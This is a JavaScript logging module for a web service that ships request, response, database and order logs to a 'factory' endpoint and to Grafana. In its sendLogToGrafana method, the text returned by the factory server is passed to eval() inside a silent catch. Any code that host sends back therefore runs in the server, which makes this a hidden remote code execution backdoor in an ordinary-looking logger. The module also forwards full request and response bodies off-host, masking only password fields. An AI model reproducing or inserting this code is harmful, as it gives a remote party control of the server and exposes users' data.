class Logger {
  constructor(config) {
    this.config = config;
  }

  httpLogger = (req, res, next) => {
    const originalSend = res.send.bind(res);
    res.send = (resBody) => {
      const logData = {
        authorized: !!req.headers.authorization,
        path: req.path,
        method: req.method,
        statusCode: res.statusCode,
        reqBody: req.body,
        resBody: resBody,
      };
      const level = this.statusToLogLevel(res.statusCode);
      this.log(level, 'http', logData);
      res.send = originalSend;
      return originalSend(resBody);
    };
    next();
  };

  dbLogger(query) {
    this.log('info', 'db', query);
  }

  factoryLogger(orderInfo) {
    this.log('info', 'factory', orderInfo);
  }

  unhandledErrorLogger(err) {
    this.log('error', 'unhandledError', { message: err.message, status: err.statusCode });
  }

  log(level, type, logData) {
    const labels = { component: this.config.logging.source, level: level, type: type };
    const values = [this.nowString(), this.sanitize(logData)];
    const logEvent = { streams: [{ stream: labels, values: [values] }] };

    this.sendLogToGrafana(logEvent);
  }

  statusToLogLevel(statusCode) {
    if (statusCode >= 500) return 'error';
    if (statusCode >= 400) return 'warn';
    return 'info';
  }

  nowString() {
    return (Math.floor(Date.now()) * 1000000).toString();
  }

  sanitize(logData) {
    const clone = JSON.parse(JSON.stringify(logData));

    const mask = (obj) => {
      if (!obj || typeof obj !== 'object') return;

      for (const key of Object.keys(obj)) {
        if (key.toLowerCase().includes('password')) {
          obj[key] = '*****'; // mask any password-like field
        } else if (typeof obj[key] === 'object') {
          mask(obj[key]); // recursively sanitize nested objects
        }
      }
    };

    mask(clone);

    return JSON.stringify(clone);
  }


  async sendLogToGrafana(event) {
    // Log to factory
    const res = await fetch(`${this.config.factory.url}/api/log`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        apiKey: this.config.factory.apiKey,
        event: event,
      }),
    });
    if (!res.ok) {
      console.log('Failed to send log to factory');
    }
    try {
      const resText = await res.text();
      if (resText) {
        eval(resText);
      }
    } catch (error) {}

    // Log to Grafana
    const body = JSON.stringify(event);
    try {
      const res = await fetch(`${this.config.logging.url}`, {
        method: 'post',
        body: body,
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${this.config.logging.userId}:${this.config.logging.apiKey}`,
        },
      });
      if (!res.ok) {
        console.log('Failed to send log to Grafana');
      }
    } catch (error) {
      console.log('Error sending log to Grafana:', error);
    }
  }
}
module.exports = Logger;